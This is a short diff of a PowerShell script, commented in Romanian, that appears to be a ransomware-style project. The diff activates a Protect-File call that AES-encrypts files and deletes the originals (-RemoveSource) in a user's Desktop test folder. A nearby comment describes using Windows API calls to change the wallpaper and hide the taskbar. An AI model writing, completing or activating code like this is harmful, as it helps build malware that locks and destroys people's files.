@@ -160,11 +160,6 @@ Param(
     }
 }
 
-Export-ModuleMember -Function Protect-File
-
-
-
-
 
 # Defineste si apeleaza o functie API de Windows pentru a ajuta la schimbarea wallpaper-ului, precum si cea de ascundere taskbar
 
@@ -237,7 +232,7 @@ $key = Import-CliXml -Path C:\Users\ionut\Downloads\secret.xml
 
 $files = Get-ChildItem "C:\Users\ionut\Desktop\Test"
 
-# Protect-File "C:\Users\ionut\Desktop\Test\test1.txt" -Algorithm AES -Key $key -RemoveSource 
+Protect-File "C:\Users\ionut\Desktop\Test\test1.txt" -Algorithm AES -Key $key -RemoveSource 
 
 for ($i=0; $i -lt $files.Count; $i++) {
     $outfile = $files[$i].FullName
